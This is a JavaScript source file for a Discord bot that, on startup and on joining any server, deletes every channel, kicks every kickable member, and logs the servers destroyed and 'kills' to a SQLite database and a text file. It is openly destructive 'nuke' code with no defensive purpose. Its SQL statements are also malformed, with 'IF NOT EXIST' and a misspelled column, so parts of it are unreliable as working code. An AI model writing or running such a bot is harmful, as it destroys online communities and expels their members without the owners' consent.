const { Client, Intents } = require("discord.js");
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MEMBERS],
});
const fs = require("fs");
const sqlite3 = require("sqlite3").verbose();
require("dotenv").config();

let db = new sqlite3.Database(
  `./db/death.db`,
  sqlite3.OPEN_READWRITE | sqlite3.OPEN_CREATE,
  (err) => {
    console.log(err);
  }
);
let TABLE_NAME = "death_log";

const DbInit = () => {
  db.run(
    `CREATE TABLE IF NOT EXIST ${TABLE_NAME}(id INTEGER PRIMARY KEY ASC, servers INTEGER, kills INTEGER);
    INSERT INTO IF NOT EXIST ${TABLE_NAME}(id, servers, klills) VALUES (1, 0, 0)`
  );
};

const Purge = () => {
  client.guilds.cache.map(async (g) => {
    let killCounter = 0;

    await (await g.channels.fetch()).forEach((ch) => ch.delete());
    await (
      await g.members.fetch()
    ).forEach((member) => {
      if (member.kickable) {
        member.kick();
        killCounter += 1;
      }
    });

    logMsg = `${new Date().toISOString()} [INFO] Death has arrived to: ${
      g.name
    } Deaths: ${killCounter} \n`;

    db.run(
      `UPDATE ${TABLE_NAME} SET servers = servers + 1, kills = kills + ${killCounter} WHERE id = 1`
    );

    fs.appendFile("log.txt", logMsg, (err) => {
      if (err) throw err;
      console.log(logMsg);
    });

    //g.leave();
  });
};

client.on("ready", () => {
  console.log(`Logged in as ${client.user.tag}!`);
  DbInit();
  Purge();
});

client.on("guildCreate", () => {
  Purge();
});

client.login(process.env.TOKEN);
db.close();
